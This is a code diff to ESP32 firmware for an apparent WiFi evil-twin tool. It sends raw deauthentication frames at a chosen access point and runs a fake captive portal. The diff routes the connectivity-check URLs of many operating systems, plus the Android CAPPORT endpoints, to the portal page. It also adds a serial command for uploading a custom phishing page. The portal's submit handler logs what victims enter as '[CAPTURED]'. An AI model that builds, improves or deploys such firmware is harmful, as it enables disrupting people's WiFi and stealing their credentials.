@@ -4,6 +4,7 @@
 #include <ESPAsyncWebServer.h>
 #include <DNSServer.h>
 #include <LittleFS.h>
+#include <atomic>
 #include "serial_handler.h"
 #include "definitions.h"
 #include "types.h"
@@ -29,21 +30,25 @@ volatile bool victim_connected = false;
 unsigned long connection_timestamp = 0;
 const unsigned long PAUSE_DURATION = 30000;
 
-// متغير للكشف عن الهدف قبل الهجوم
-volatile bool target_seen = false;
+std::atomic<bool> target_seen{false};
 
 deauth_frame_t deauth_frame;
 extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 
 // ================= HELPER FUNCTIONS ================= //
-void strToMac(String macStr, uint8_t *mac)
+bool strToMac(String macStr, uint8_t *mac)
 {
     unsigned int values[6];
     if (6 == sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]))
     {
         for (int i = 0; i < 6; ++i)
+        {
+            if (values[i] > 0xFF) return false;
             mac[i] = (uint8_t)values[i];
+        }
+        return true;
     }
+    return false;
 }
 
 void applyWifiFix()
@@ -121,26 +126,46 @@ IRAM_ATTR void attack_sniffer(void *buf, wifi_promiscuous_pkt_type_t type)
 // ================= ASYNC WEB HANDLERS ================= //
 void setupServer()
 {
-    server.on("/generate_204", HTTP_ANY, [](AsyncWebServerRequest *request)
-              { request->redirect("http://4.3.2.1/"); });
-    server.on("/gen_204", HTTP_ANY, [](AsyncWebServerRequest *request)
-              { request->redirect("http://4.3.2.1/"); });
-    server.on("/ncsi.txt", HTTP_ANY, [](AsyncWebServerRequest *request)
-              { request->redirect("http://4.3.2.1/"); });
-    server.on("/hotspot-detect.html", HTTP_ANY, [](AsyncWebServerRequest *request)
-              { request->redirect("http://4.3.2.1/"); });
-    server.on("/connecttest.txt", HTTP_ANY, [](AsyncWebServerRequest *request)
-              { request->redirect("http://logout.net"); });
+    // Captive portal detection — serve HTML directly (200), NOT redirect.
+    // Samsung One UI breaks on 302 redirects; needs 200+HTML body.
+    // Apple needs "Success" in body; catch-all handles random iOS 8.4+ paths.
+    auto servePortal = [](AsyncWebServerRequest *request)
+    {
+        if (LittleFS.exists("/custom.html"))
+            request->send(LittleFS, "/custom.html", "text/html");
+        else
+            request->send(LittleFS, "/index.html", "text/html");
+    };
+
+    server.on("/generate_204", HTTP_ANY, servePortal);
+    server.on("/gen_204", HTTP_ANY, servePortal);
+    server.on("/generate204", HTTP_ANY, servePortal);
+    server.on("/ncsi.txt", HTTP_ANY, servePortal);
+    server.on("/hotspot-detect.html", HTTP_ANY, servePortal);
+    server.on("/connecttest.txt", HTTP_ANY, servePortal);
+    server.on("/success.txt", HTTP_ANY, servePortal);
+    server.on("/success.html", HTTP_ANY, servePortal);
+    server.on("/library/test/success.html", HTTP_ANY, servePortal);
+    server.on("/fwlink", HTTP_ANY, servePortal);
+    server.on("/canonical.html", HTTP_ANY, servePortal);
+    server.on("/check_network_status.txt", HTTP_ANY, servePortal);
+    server.on("/network_status.html", HTTP_ANY, servePortal);
+    server.on("/redirect", HTTP_ANY, servePortal);
+    server.on("/kindle-wifi/wifistub.html", HTTP_ANY, servePortal);
 
     server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request)
-              { request->send(LittleFS, "/index.html", "text/html"); });
+              {
+        if (LittleFS.exists("/custom.html"))
+            request->send(LittleFS, "/custom.html", "text/html");
+        else
+            request->send(LittleFS, "/index.html", "text/html"); });
 
     server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request)
               {
         if (request->hasArg("name")) {
             captured_name = request->arg("name");
             verification_status = 1;
-            Serial.println("[CAPTURED] " + captured_name); // رد مختصر لسهولة البارسينج
+            Serial.println("[CAPTURED] " + captured_name);
             request->send(200, "text/plain", "received");
         } else {
             request->send(400, "text/plain", "error");
@@ -154,8 +179,16 @@ void setupServer()
         else if (verification_status == 3) statusMsg = "NO";
         request->send(200, "text/plain", statusMsg); });
 
-    server.onNotFound([](AsyncWebServerRequest *request)
-                      { request->redirect("http://4.3.2.1/"); });
+    // CAPPORT API (RFC 8908) — Android 12+ captive portal API
+    server.on("/.well-known/captiveportal/check", HTTP_ANY, [](AsyncWebServerRequest *request)
+              { request->send(200, "application/json", "{\"captive\":true,\"user-portal-url\":\"http://4.3.2.1/\"}"); });
+    server.on("/.well-known/capport", HTTP_ANY, [](AsyncWebServerRequest *request)
+              { request->send(200, "application/json", "{\"captive\":true,\"user-portal-url\":\"http://4.3.2.1/\"}"); });
+    server.on("/.well-known/captiveportal", HTTP_ANY, [](AsyncWebServerRequest *request)
+              { request->send(200, "application/json", "{\"captive\":true,\"user-portal-url\":\"http://4.3.2.1/\"}"); });
+
+    // Catch-all: serve portal HTML (not redirect) for Samsung compatibility
+    server.onNotFound(servePortal);
 
     server.begin();
 }
@@ -285,7 +318,11 @@ void serial_cmd_handle()
                 String bssid = rawInput.substring(s1 + 1, s2);
                 String ch = rawInput.substring(s2 + 1, s3);
                 String dur = rawInput.substring(s3 + 1);
-                strToMac(bssid, target_bssid);
+                if (!strToMac(bssid, target_bssid))
+                {
+                    Serial.println("[ERROR]Invalid MAC");
+                    return;
+                }
                 target_channel = ch.toInt();
                 int d = dur.toInt();
 
@@ -374,6 +411,67 @@ void serial_cmd_handle()
             {
                 Serial.println("[ERROR] INVALID_SYNTAX_HOST");
             }
+            return;
+        }
+
+        // --- SET_HTML (Custom Captive Portal) ---
+        if (cmdInput.startsWith("SET_HTML "))
+        {
+            int spaceIdx = rawInput.indexOf(' ');
+            if (spaceIdx <= 0) { Serial.println("[ERROR] INVALID_SYNTAX_SET_HTML"); return; }
+
+            int htmlLen = rawInput.substring(spaceIdx + 1).toInt();
+            if (htmlLen <= 0 || htmlLen > MAX_HTML_SIZE) { Serial.println("[ERROR] INVALID_LENGTH"); return; }
+
+            Serial.println("[READY] SEND_HTML");
+
+            // Read exactly htmlLen bytes (may span multiple serial reads)
+            char *buf = (char *)malloc(htmlLen + 1);
+            if (!buf) { Serial.println("[ERROR] MEMORY_ALLOC_FAILED"); return; }
+
+            int received = 0;
+            unsigned long startTime = millis();
+            while (received < htmlLen)
+            {
+                if (millis() - startTime > 5000) { free(buf); Serial.println("[ERROR] RECEIVE_TIMEOUT"); return; }
+                int available = Serial.available();
+                if (available > 0)
+                {
+                    int toRead = min(available, htmlLen - received);
+                    int bytesRead = Serial.readBytes(buf + received, toRead);
+                    received += bytesRead;
+                }
+                else
+                {
+                    delay(1);
+                }
+            }
+            buf[htmlLen] = '\0';
+
+            // Save to LittleFS
+            File f = LittleFS.open("/custom.html", "w");
+            if (f)
+            {
+                f.write((const uint8_t *)buf, htmlLen);
+                f.close();
+                free(buf);
+                Serial.printf("[SUCCESS] HTML_SAVED %d bytes\n", htmlLen);
+            }
+            else
+            {
+                free(buf);
+                Serial.println("[ERROR] FS_WRITE_FAILED");
+            }
+            return;
+        }
+
+        // --- CLEAR_HTML ---
+        if (cmdInput == "CLEAR_HTML")
+        {
+            if (LittleFS.remove("/custom.html"))
+                Serial.println("[SUCCESS] HTML_CLEARED");
+            else
+                Serial.println("[ERROR] CLEAR_FAILED");
             return;
         }
 
